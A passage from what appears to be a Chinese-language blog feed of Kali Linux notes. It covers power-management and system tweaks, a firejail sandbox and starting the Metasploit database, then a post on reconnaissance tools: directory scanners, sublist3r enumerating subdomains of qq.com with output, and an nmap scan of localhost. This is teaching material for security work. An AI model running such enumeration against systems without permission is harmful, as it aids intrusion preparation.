class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># af install tlp tlp-rdw</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">61b4c3|OK  |   1.9MiB/s|/var/cache/apt/apt-fast/tlp_1.3.1-2_all.deb</span><br><span class="line"></span><br><span class="line">状态标识：</span><br><span class="line">(OK)：下载已完成。</span><br><span class="line">正在读取软件包列表... 完成</span><br><span class="line">正在分析软件包的依赖关系树... 完成</span><br><span class="line">正在读取状态信息... 完成</span><br><span class="line">建议安装：</span><br><span class="line">  tp-smapi-dkms acpi-call-dkms linux-cpupower</span><br><span class="line">下列【新】软件包将被安装：</span><br><span class="line">  tlp tlp-rdw</span><br><span class="line">升级了 0 个软件包，新安装了 2 个软件包，要卸载 0 个软件包，有 4 个软件包未被升级。</span><br><span class="line">需要下载 0 B/87.4 kB 的归档。</span><br><span class="line">解压缩后会消耗 403 kB 的额外空间。</span><br><span class="line">正在选中未选择的软件包 tlp。</span><br><span class="line">(正在读取数据库 ... 系统当前共安装有 467060 个文件和目录。)</span><br><span class="line">准备解压 .../archives/tlp_1.3.1-2_all.deb  ...</span><br><span class="line">正在解压 tlp (1.3.1-2) ...</span><br><span class="line">正在选中未选择的软件包 tlp-rdw。</span><br><span class="line">准备解压 .../tlp-rdw_1.3.1-2_all.deb  ...</span><br><span class="line">正在解压 tlp-rdw (1.3.1-2) ...</span><br><span class="line">正在设置 tlp (1.3.1-2) ...</span><br><span class="line">update-rc.d: We have no instructions <span class="keyword">for</span> the tlp init script.</span><br><span class="line">update-rc.d: It looks like a non-network service, we <span class="built_in">enable</span> it.</span><br><span class="line">正在设置 tlp-rdw (1.3.1-2) ...</span><br><span class="line">正在处理用于 man-db (2.9.4-2) 的触发器 ...</span><br><span class="line">正在处理用于 kali-menu (2021.2.0) 的触发器 ...</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># sudo tlp start</span></span><br><span class="line">TLP started <span class="keyword">in</span> AC mode (auto).</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># sudo tlp-stat</span></span><br><span class="line">--- TLP 1.3.1 --------------------------------------------</span><br><span class="line"></span><br><span class="line">+++ Configured Settings:</span><br><span class="line">defaults.conf L0004: TLP_ENABLE=<span class="string">&quot;1&quot;</span></span><br><span class="line">defaults.conf L0005: TLP_PERSISTENT_DEFAULT=<span class="string">&quot;0&quot;</span></span><br><span class="line">defaults.conf L0006: DISK_IDLE_SECS_ON_AC=<span class="string">&quot;0&quot;</span></span><br><span class="line">defaults.conf L0007: DISK_IDLE_SECS_ON_BAT=<span class="string">&quot;2&quot;</span></span><br><span class="line">defaults.conf L0008: MAX_LOST_WORK_SECS_ON_AC=<span class="string">&quot;15&quot;</span></span><br><span class="line">defaults.conf L0009: MAX_LOST_WORK_SECS_ON_BAT=<span class="string">&quot;60&quot;</span></span><br><span class="line">defaults.conf L0010: CPU_ENERGY_PERF_POLICY_ON_AC=<span class="string">&quot;balance_performance&quot;</span></span><br><span class="line">defaults.conf L0011: CPU_ENERGY_PERF_POLICY_ON_BAT=<span class="string">&quot;balance_power&quot;</span></span><br><span class="line">defaults.conf L0012: SCHED_POWERSAVE_ON_AC=<span class="string">&quot;0&quot;</span></span><br><span class="line">defaults.conf L0013: SCHED_POWERSAVE_ON_BAT=<span class="string">&quot;1&quot;</span></span><br><span class="line">defaults.conf L0014: NMI_WATCHDOG=<span class="string">&quot;0&quot;</span></span><br><span class="line">defaults.conf L0015: DISK_DEVICES=<span class="string">&quot;nvme0n1 sda&quot;</span></span><br><span class="line">defaults.conf L0016: DISK_APM_LEVEL_ON_AC=<span class="string">&quot;254 254&quot;</span></span><br><span class="line">defaults.conf L0017: DISK_APM_LEVEL_ON_BAT=<span class="string">&quot;128 128&quot;</span></span><br><span class="line">defaults.conf L0018: DISK_IOSCHED=<span class="string">&quot;keep keep&quot;</span></span><br><span class="line">defaults.conf L0019: SATA_LINKPWR_ON_AC=<span class="string">&quot;med_power_with_dipm max_performance&quot;</span></span><br><span class="line">defaults.conf L0020: SATA_LINKPWR_ON_BAT=<span class="string">&quot;med_power_with_dipm min_power&quot;</span></span><br><span class="line">defaults.conf L0021: AHCI_RUNTIME_PM_TIMEOUT=<span class="string">&quot;15&quot;</span></span><br><span class="line">defaults.conf L0022: PCIE_ASPM_ON_AC=<span class="string">&quot;default&quot;</span></span><br><span class="line">defaults.conf L0023: PCIE_ASPM_ON_BAT=<span class="string">&quot;default&quot;</span></span><br><span class="line">defaults.conf L0024: RADEON_POWER_PROFILE_ON_AC=<span class="string">&quot;default&quot;</span></span><br><span class="line">defaults.conf L0025: RADEON_POWER_PROFILE_ON_BAT=<span class="string">&quot;default&quot;</span></span><br><span class="line">defaults.conf L0026: RADEON_DPM_PERF_LEVEL_ON_AC=<span class="string">&quot;auto&quot;</span></span><br><span class="line">defaults.conf L0027: RADEON_DPM_PERF_LEVEL_ON_BAT=<span class="string">&quot;auto&quot;</span></span><br><span class="line">defaults.conf L0028: WIFI_PWR_ON_AC=<span class="string">&quot;off&quot;</span></span><br><span class="line">defaults.conf L0029: WIFI_PWR_ON_BAT=<span class="string">&quot;on&quot;</span></span><br><span class="line">defaults.conf L0030: WOL_DISABLE=<span class="string">&quot;Y&quot;</span></span><br><span class="line">defaults.conf L0031: SOUND_POWER_SAVE_ON_AC=<span class="string">&quot;0&quot;</span></span><br><span class="line">defaults.conf L0032: SOUND_POWER_SAVE_ON_BAT=<span class="string">&quot;1&quot;</span></span><br><span class="line">defaults.conf L0033: SOUND_POWER_SAVE_CONTROLLER=<span class="string">&quot;Y&quot;</span></span><br><span class="line">defaults.conf L0034: BAY_POWEROFF_ON_AC=<span class="string">&quot;0&quot;</span></span><br><span class="line">defaults.conf L0035: BAY_POWEROFF_ON_BAT=<span class="string">&quot;0&quot;</span></span><br><span class="line">defaults.conf L0036: BAY_DEVICE=<span class="string">&quot;sr0&quot;</span></span><br><span class="line">defaults.conf L0037: RUNTIME_PM_ON_AC=<span class="string">&quot;on&quot;</span></span><br><span class="line">defaults.conf L0038: RUNTIME_PM_ON_BAT=<span class="string">&quot;auto&quot;</span></span><br><span class="line">defaults.conf L0039: RUNTIME_PM_DRIVER_BLACKLIST=<span class="string">&quot;amdgpu mei_me nouveau nvidia pcieport radeon&quot;</span></span><br><span class="line">defaults.conf L0040: USB_AUTOSUSPEND=<span class="string">&quot;1&quot;</span></span><br><span class="line">defaults.conf L0041: USB_BLACKLIST_BTUSB=<span class="string">&quot;0&quot;</span></span><br><span class="line">defaults.conf L0042: USB_BLACKLIST_PHONE=<span class="string">&quot;0&quot;</span></span><br><span class="line">defaults.conf L0043: USB_BLACKLIST_PRINTER=<span class="string">&quot;1&quot;</span></span><br><span class="line">defaults.conf L0044: USB_BLACKLIST_WWAN=<span class="string">&quot;0&quot;</span></span><br><span class="line">defaults.conf L0045: USB_AUTOSUSPEND_DISABLE_ON_SHUTDOWN=<span class="string">&quot;0&quot;</span></span><br><span class="line">defaults.conf L0046: RESTORE_DEVICE_STATE_ON_STARTUP=<span class="string">&quot;0&quot;</span></span><br><span class="line">defaults.conf L0047: RESTORE_THRESHOLDS_ON_BAT=<span class="string">&quot;0&quot;</span></span><br><span class="line">defaults.conf L0048: NATACPI_ENABLE=<span class="string">&quot;1&quot;</span></span><br><span class="line">defaults.conf L0049: TPACPI_ENABLE=<span class="string">&quot;1&quot;</span></span><br><span class="line">defaults.conf L0050: TPSMAPI_ENABLE=<span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line">+++ System Info</span><br><span class="line">System         = Tencent Cloud 3.0 CVM</span><br><span class="line">BIOS           = seabios-1.9.1-qemu-project.org</span><br><span class="line">Release        = Kali GNU/Linux Rolling</span><br><span class="line">Kernel         = 5.10.0-kali5-amd64 <span class="comment">#1 SMP Debian 5.10.24-1kali1 (2021-03-23) x86_64</span></span><br><span class="line">/proc/cmdline  = BOOT_IMAGE=/boot/vmlinuz-5.10.0-kali5-amd64 root=UUID=c8ace5dc-4db8-438d-be1f-bfe23e0fba66 ro quiet splash</span><br><span class="line">Init system    = systemd v247 (247.3-3)</span><br><span class="line">Boot mode      = BIOS (CSM, Legacy)</span><br><span class="line">SELinux status = disabled</span><br><span class="line"></span><br><span class="line">+++ TLP Status</span><br><span class="line">State          = enabled</span><br><span class="line">RDW state      = enabled</span><br><span class="line">Last run       = 14时57分20秒,      4 sec(s) ago</span><br><span class="line">Mode           = AC</span><br><span class="line">Power <span class="built_in">source</span>   = unknown</span><br><span class="line"></span><br><span class="line">Notice: tlp.service is not enabled -- invoke <span class="string">&quot;systemctl enable tlp.service&quot;</span> to correct this!</span><br><span class="line"></span><br><span class="line">+++ Processor</span><br><span class="line">CPU model      = AMD EPYC 7K62 48-Core Processor</span><br><span class="line"></span><br><span class="line">/sys/devices/system/cpu/cpufreq/boost                  = (not available)</span><br><span class="line"></span><br><span class="line">Intel EPB: unsupported CPU.</span><br><span class="line"></span><br><span class="line">/sys/module/workqueue/parameters/power_efficient       = N</span><br><span class="line">/proc/sys/kernel/nmi_watchdog                          = 0</span><br><span class="line"></span><br><span class="line">+++ Temperatures</span><br><span class="line">Fan speed              = (not available)</span><br><span class="line"></span><br><span class="line">+++ File System</span><br><span class="line">/proc/sys/vm/laptop_mode               =     0</span><br><span class="line">/proc/sys/vm/dirty_writeback_centisecs =  1500</span><br><span class="line">/proc/sys/vm/dirty_expire_centisecs    =  1500</span><br><span class="line">/proc/sys/vm/dirty_ratio               =    20</span><br><span class="line">/proc/sys/vm/dirty_background_ratio    =    10</span><br><span class="line"></span><br><span class="line">+++ Storage Devices</span><br><span class="line">Devices = nvme0n1 sda</span><br><span class="line"></span><br><span class="line">/dev/nvme0n1: not present.</span><br><span class="line"></span><br><span class="line">/dev/sda: not present.</span><br><span class="line"></span><br><span class="line">+++ AHCI Link Power Management (ALPM)</span><br><span class="line">No AHCI-enabled host controller detected.</span><br><span class="line"></span><br><span class="line">+++ AHCI Host Controller Runtime Power Management</span><br><span class="line">/sys/bus/pci/devices/0000:00:01.1/ata1/power/control = on</span><br><span class="line">/sys/bus/pci/devices/0000:00:01.1/ata2/power/control = on</span><br><span class="line"></span><br><span class="line">+++ Wireless</span><br><span class="line">bluetooth = none (no device)</span><br><span class="line">wifi      = none (no device)</span><br><span class="line">wwan      = none (no device)</span><br><span class="line"></span><br><span class="line">+++ Audio</span><br><span class="line"></span><br><span class="line">+++ PCIe Active State Power Management</span><br><span class="line">/sys/module/pcie_aspm/parameters/policy = [default] performance powersave powersupersave (using BIOS preferences)</span><br><span class="line"></span><br><span class="line">+++ Runtime Power Management</span><br><span class="line">Device blacklist = (not configured)</span><br><span class="line">Driver blacklist = amdgpu mei_me nouveau nvidia pcieport radeon</span><br><span class="line"></span><br><span class="line">/sys/bus/pci/devices/0000:00:00.0/power/control = on   (0x060000, Host bridge, no driver)</span><br><span class="line">/sys/bus/pci/devices/0000:00:01.0/power/control = on   (0x060100, ISA bridge, no driver)</span><br><span class="line">/sys/bus/pci/devices/0000:00:01.1/power/control = on   (0x010180, IDE interface, ata_piix)</span><br><span class="line">/sys/bus/pci/devices/0000:00:01.2/power/control = on   (0x0c0300, USB controller, uhci_hcd)</span><br><span class="line">/sys/bus/pci/devices/0000:00:01.3/power/control = on   (0x068000, Bridge, piix4_smbus)</span><br><span class="line">/sys/bus/pci/devices/0000:00:02.0/power/control = on   (0x030000, VGA compatible controller, cirrus)</span><br><span class="line">/sys/bus/pci/devices/0000:00:03.0/power/control = on   (0x060400, PCI bridge, no driver)</span><br><span class="line">/sys/bus/pci/devices/0000:00:04.0/power/control = on   (0x060400, PCI bridge, no driver)</span><br><span class="line">/sys/bus/pci/devices/0000:00:05.0/power/control = on   (0x020000, Ethernet controller, virtio-pci)</span><br><span class="line">/sys/bus/pci/devices/0000:00:06.0/power/control = on   (0x010000, SCSI storage controller, virtio-pci)</span><br><span class="line">/sys/bus/pci/devices/0000:00:07.0/power/control = on   (0x00ff00, Unclassified device [00ff], virtio-pci)</span><br><span class="line"></span><br><span class="line">+++ USB</span><br><span class="line">Autosuspend         = enabled</span><br><span class="line">Device whitelist    = (not configured)</span><br><span class="line">Device blacklist    = (not configured)</span><br><span class="line">Bluetooth blacklist = disabled</span><br><span class="line">Phone blacklist     = disabled</span><br><span class="line">WWAN blacklist      = disabled</span><br><span class="line"></span><br><span class="line">Bus 001 Device 001 ID 1d6b:0001 control = auto, autosuspend_delay_ms =    0 -- Linux Foundation 1.1 root hub (hub)</span><br><span class="line"></span><br><span class="line">+++ Battery Features: Charge Thresholds and Recalibrate</span><br><span class="line">natacpi    = inactive (no kernel support)</span><br><span class="line">tpacpi-bat = inactive (laptop not supported)</span><br><span class="line">tp-smapi   = inactive (laptop not supported)</span><br><span class="line"></span><br><span class="line">+++ Battery Status</span><br><span class="line">No battery data available.</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="限制inode缓存">限制inode缓存</h2><p>建议大于4g内存的计算机限制inode缓存</p><p>代价是某些系统项将在RAM内存中保留更长的时间</p><p>这将减少用于一般任务的可用RAM数量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gedit admin:///etc/sysctl.conf</span><br><span class="line"><span class="comment">#添加如下</span></span><br><span class="line">vm.vfs_cache_pressure=50</span><br></pre></td></tr></table></figure><h2 id="tmp-放到内存里">/tmp 放到内存里</h2><p>内存大于8g计算机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo cp -v /usr/share/systemd/tmp.mount /etc/systemd/system/</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> tmp.mount &amp;&amp; reboot</span><br></pre></td></tr></table></figure><p>查看状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status tmp.mount</span><br></pre></td></tr></table></figure><p>取消使用/tmpfs</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rm -v /etc/systemd/system/tmp.mount</span><br></pre></td></tr></table></figure><h2 id="禁用无线芯片电源管理">禁用无线芯片电源管理</h2><p>以提高用电量为代价,提高速度和无线质量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gedit admin:///etc/NetworkManager/conf.d/default-wifi-powersave-on.conf</span><br><span class="line"><span class="comment">#修改</span></span><br><span class="line">wifi.powersave = 2</span><br><span class="line"><span class="comment">#重启</span></span><br></pre></td></tr></table></figure><h2 id="partial-reboot-部分重启">partial reboot /部分重启</h2><p>linux如果死机,可尝试partial reboot (ctrl + alt + back)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gedit admin:&#x2F;&#x2F;&#x2F;etc&#x2F;default&#x2F;keyboard</span><br><span class="line">#修改</span><br><span class="line">XKBOPTIONS&#x3D;&quot;terminate:ctrl_alt_bksp&quot;</span><br><span class="line">#重启</span><br></pre></td></tr></table></figure><h2 id="firejail沙箱">firejail沙箱</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#安装</span><br><span class="line">af install firejail</span><br><span class="line">#使用</span><br><span class="line">firejail firefox</span><br><span class="line">#验证</span><br><span class="line">firejail --tree</span><br></pre></td></tr></table></figure><h2 id="开启数据库">开启数据库</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service postgresql start</span><br><span class="line">msfdb init</span><br></pre></td></tr></table></figure><h2 id="未完待续">未完待续</h2>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息搜集</title>
      <link href="posts/b21d488/"/>
      <url>posts/b21d488/</url>
      
        <content type="html"><![CDATA[<h2 id="whois">whois</h2><p>推荐站长之家api调用</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210323150846.png" alt="image-20210323150835126"></p><h2 id="常见网站架构的类型">常见网站架构的类型</h2><p>1.php+mysql+win/linux</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.2003 iis6.0&#x2F;2008 iis7.0&#x2F;2012 iis8.0</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2. apache</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3.nginx</span><br></pre></td></tr></table></figure><p>2.aspx+access/mssql+win 3. 3.jsp+oracle/mysql/+win/linux</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.tomcat</span><br></pre></td></tr></table></figure><p>4.php+postgresql+linux</p><h2 id="文件和目录扫描工具">文件和目录扫描工具</h2><ul><li>御剑后台扫描工具</li><li>dirbuster</li><li>pk<br><img src="/image/Snipaste_2021-04-09_21-47-30.png" alt=""></li></ul><h2 id="子域名收集">子域名收集</h2><ul><li><p>layer子域名挖掘机<br><img src="/image/1617970146138.png" alt=""></p></li><li><p>subDomainBrute<br><img src="/image/1617971009122.png" alt=""><br>安装常见问题 默认 python pip 版本不对应<br><a href="https://www.dansemal.cn/index.php/archives/1/#toc_3">更换默认python版本为3</a> <a href="https://www.dansemal.cn/index.php/archives/1/#toc_8">安装pip3</a> <img src="/image/1617971506170.png" alt=""></p></li><li><p>wydomain</p></li><li><p>sublist3r</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">af install sublist3r <span class="comment">#kali下</span></span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># sublist3r -d qq.com                                                                                                            130 ⨯</span></span><br><span class="line"></span><br><span class="line">                 ____        _     _ _     _   _____</span><br><span class="line">                / ___| _   _| |__ | (_)___| |_|___ / _ __</span><br><span class="line">                \___ \| | | | <span class="string">&#x27;_ \| | / __| __| |_ \| &#x27;</span>__|</span><br><span class="line">                 ___) | |_| | |_) | | \__ \ |_ ___) | |</span><br><span class="line">                |____/ \__,_|_.__/|_|_|___/\__|____/|_|</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Coded By Ahmed Aboul-Ela - @aboul3la</span></span><br><span class="line"></span><br><span class="line">[-] Enumerating subdomains now <span class="keyword">for</span> qq.com</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Baidu..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Yahoo..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Google..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Bing..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Ask..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Netcraft..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> DNSdumpster..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Virustotal..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> ThreatCrowd..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> SSL Certificates..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> PassiveDNS..</span><br><span class="line">[-] Total Unique Subdomains Found: 2690</span><br><span class="line">login.imqq.com</span><br><span class="line">localhost.ptlogin2.imqq.com</span><br><span class="line">ssl.ptlogin2.imqq.com</span><br><span class="line">ssl.ui.ptlogin2.imqq.com</span><br><span class="line">ssl.xui.ptlogin2.imqq.com</span><br><span class="line">www.qq.com</span><br><span class="line">0.qq.com</span><br><span class="line">007.qq.com</span><br><span class="line">021.qq.com</span><br><span class="line">1.qq.com</span><br><span class="line">10.qq.com</span><br><span class="line">100.qq.com</span><br><span class="line">file.100.qq.com</span><br><span class="line">res.100.qq.com</span><br><span class="line">1000.qq.com</span><br><span class="line">101.qq.com</span><br><span class="line">pick.101.qq.com</span><br><span class="line">game.108.qq.com</span><br><span class="line">110.qq.com</span><br><span class="line">1108.qq.com</span><br><span class="line">111.qq.com</span><br><span class="line">1111.qq.com</span><br><span class="line">124bjg0.qq.com</span><br><span class="line">12530.qq.com</span><br><span class="line">176.qq.com</span><br><span class="line">17roco.qq.com</span><br><span class="line">m.17roco.qq.com</span><br><span class="line">m1.17roco.qq.com</span><br><span class="line">mres.17roco.qq.com</span><br></pre></td></tr></table></figure></li></ul><p><a href="https://www.webscan.cc/">c段查询</a></p><h2 id="端口扫描">端口扫描</h2><ul><li><h3 id="nmap">nmap</h3></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -all ip</span><br></pre></td></tr></table></figure><p><img src="/image/2021-04-10-13-52-38.png" alt=""></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># nmap -v -A -p1-65535 127.0.0.1</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-10 13:58 CST</span><br><span class="line">NSE: Loaded 153 scripts <span class="keyword">for</span> scanning.</span><br><span class="line">NSE: Script Pre-scanning.</span><br><span class="line">Initiating NSE at 13:58</span><br><span class="line">Completed NSE at 13:58, 0.00s elapsed</span><br><span class="line">Initiating NSE at 13:58</span><br><span class="line">Completed NSE at 13:58, 0.00s elapsed</span><br><span class="line">Initiating NSE at 13:58</span><br><span class="line">Completed NSE at 13:58, 0.00s elapsed</span><br><span class="line">Initiating SYN Stealth Scan at 13:58</span><br><span class="line">Scanning localhost (127.0.0.1) [65535 ports]</span><br><span class="line">Discovered open port 22/tcp on 127.0.0.1</span><br><span class="line">Completed SYN Stealth Scan at 13:58, 0.37s elapsed (65535 total ports)</span><br><span class="line">Initiating Service scan at 13:58</span><br><span class="line">Scanning 1 service on localhost (127.0.0.1)</span><br><span class="line">Completed Service scan at 13:58, 0.01s elapsed (1 service on 1 host)</span><br><span class="line">Initiating OS detection (try <span class="comment">#1) against localhost (127.0.0.1)</span></span><br><span class="line">Retrying OS detection (try <span class="comment">#2) against localhost (127.0.0.1)</span></span><br><span class="line">Retrying OS detection (try <span class="comment">#3) against localhost (127.0.0.1)</span></span><br><span class="line">Retrying OS detection (try <span class="comment">#4) against localhost (127.0.0.1)</span></span><br><span class="line">Retrying OS detection (try <span class="comment">#5) against localhost (127.0.0.1)</span></span><br><span class="line">NSE: Script scanning 127.0.0.1.</span><br><span class="line">Initiating NSE at 13:58</span><br><span class="line">Completed NSE at 13:58, 0.08s elapsed</span><br><span class="line">Initiating NSE at 13:58</span><br><span class="line">Completed NSE at 13:58, 0.00s elapsed</span><br><span class="line">Initiating NSE at 13:58</span><br><span class="line">Completed NSE at 13:58, 0.00s elapsed</span><br><span class="line">Nmap scan report <span class="keyword">for</span> localhost (127.0.0.1)</span><br><span class="line">Host is up (0.000018s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 95:24:8a:70:02:c1:7c:b9:63:1d:57:bd:c4:ba:59:84 (RSA)</span><br><span class="line">|   256 ac:24:26:ce:c9:34:47:e7:62:38:13:d1:03:6d:c7:54 (ECDSA)</span><br><span class="line">|_  256 79:e3:be:ae:1e:ee:87:ed:bd:3d:b3:23:e6:de:92:08 (ED25519)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.91%E=4%D=4/10%OT=22%CT=1%CU=43844%PV=N%DS=0%DC=L%G=Y%TM=60713E8</span><br><span class="line">OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS</span><br><span class="line">OS:(O1=MFFD7ST11NWA%O2=MFFD7ST11NWA%O3=MFFD7NNT11NWA%O4=MFFD7ST11NWA%O5=MFF</span><br><span class="line">OS:D7ST11NWA%O6=MFFD7ST11)WIN(W1=FFCB%W2=FFCB%W3=FFCB%W4=FFCB%W5=FFCB%W6=FF</span><br><span class="line">OS:CB)ECN(R=Y%DF=Y%T=40%W=FFD7%O=MFFD7NNSNWA%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A</span><br><span class="line">OS:=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%</span><br><span class="line">OS:Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=</span><br><span 